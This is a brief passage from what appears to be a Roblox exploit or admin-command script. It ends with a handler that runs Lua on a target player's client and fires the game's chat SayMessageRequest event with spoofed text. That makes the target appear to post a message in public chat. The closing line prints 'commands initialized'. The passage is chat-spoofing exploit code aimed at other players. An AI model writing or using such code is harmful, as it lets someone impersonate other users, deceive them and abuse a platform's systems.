            yemenv.runLua(target, `game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{spoofText}", "All")`)
        end)
    end
end)

print'commands initialized'
